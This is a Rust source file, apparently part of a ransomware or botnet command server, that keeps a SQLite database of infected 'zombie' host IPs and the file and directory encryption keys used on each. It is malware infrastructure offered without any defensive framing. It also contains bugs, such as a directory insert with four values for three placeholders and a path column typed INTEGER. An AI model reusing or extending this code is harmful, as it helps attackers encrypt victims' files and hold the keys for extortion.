// database functions for storing encryption keys and related files
// i should probably use a nosql database for this but sqlite is easy and its not important

use core::str;
use std::path::PathBuf;

use lazy_static::lazy_static;
use rusqlite::{Connection, Result, params};

use crate::SRV_SAVE_DIR;

const ZOMBIE_TABLE: &str = r#"CREATE TABLE "zombie" (
	"ip"	TEXT NOT NULL,
	PRIMARY KEY("ip")
);"#;

const FILE_TABLE: &str = r#"CREATE TABLE "file" (
	"id"	INTEGER,
	"zombie_ip"	TEXT NOT NULL,
	"path"	TEXT NOT NULL,
    "key" BLOB NOT NULL,
	PRIMARY KEY("id"),
	FOREIGN KEY("zombie_ip") REFERENCES "zombie"("ip")
);"#;

const DIR_TABLE: &str = r#"CREATE TABLE "dir" (
	"id"	INTEGER,
	"zombie_ip"	TEXT NOT NULL,
	"path"	INTEGER NOT NULL,
	"is_recursive"	INTEGER NOT NULL,
    "key" BLOB NOT NULL,
	FOREIGN KEY("zombie_ip") REFERENCES "zombie"("ip"),
	PRIMARY KEY("id")
);"#;


lazy_static!{
    static ref DBPATH: PathBuf = PathBuf::from(SRV_SAVE_DIR).join("encryption.db");
}



pub struct Zombie {
    ip: String,
}

pub struct FileEncryption {
    id: i32,
    zombie_ip: String,
    path: String,
    key: Vec<u8>,
    iv: Vec<u8>
}

pub struct DirEncryption {
    id: i32,
    zombie_ip: String,
    path: String,
    is_recursive: bool,
    key: Vec<u8>,
    iv: Vec<u8>
}


pub fn init_db() -> Result<()> {
    let conn = Connection::open(&*DBPATH)?;
    for table in ["zombie", "file", "dir"] {
        let mut stmt = conn.prepare(
            "SELECT name FROM sqlite_master 
            WHERE type='table' AND name=?1",
        )?;
        let rows = stmt.query_map(params![table], |_| Ok(()))?;
        if rows.count() != 1 {
            match table {
                "zombie" => conn.execute(ZOMBIE_TABLE, ())?,
                "file" => conn.execute(FILE_TABLE, ())?,
                "dir" => conn.execute(DIR_TABLE, ())?,
                _ => 0
            };
        }
    }
    Ok(())
}

fn file_already_encrypted(path: &str, ip: &str) -> Result<bool> {
    let conn = Connection::open(&*DBPATH)?;
    let mut stmt = conn.prepare_cached("SELECT path FROM file WHERE path = ?1 AND zombie_ip = ?2")?;
    let exists = stmt.exists([path, ip])?;

    Ok(exists)
}

fn dir_already_encrypted(path: &str, ip: &str) -> Result<bool> {
    let conn = Connection::open(&*DBPATH)?;
    let mut stmt = conn.prepare_cached("SELECT path FROM dir WHERE path = ?1 AND zombie_ip = ?2")?;
    let exists = stmt.exists([path, ip])?;

    Ok(exists)
}

pub fn insert_file(path: &str, ip: &str, key: Vec<u8>) -> Result<bool> {
    if file_already_encrypted(path, ip)? {
        return Ok(false)
    }
    let conn = Connection::open(&*DBPATH)?;

    let stmt = conn.execute("INSERT INTO file (zombie_ip, path, key) VALUES (?1, ?2, ?3)", params![ip, path, key])?;
    if stmt > 0 {
        Ok(true)
    } else {
        Ok(false)
    }
}

pub fn insert_dir(path: String, ip: String, key: Vec<u8>, is_recursive: bool) -> Result<bool>{
    if dir_already_encrypted(&path, &ip)? {
        return Ok(false)
    }
    let conn = Connection::open(&*DBPATH)?;

    let stmt = conn.execute("INSERT INTO dir (zombie_ip, key, path, is_recursive) VALUES (?1, ?2, ?3)", params![ip, key, path, is_recursive])?;
    if stmt > 0 {
        Ok(true)
    } else {
        Ok(false)
    }
}











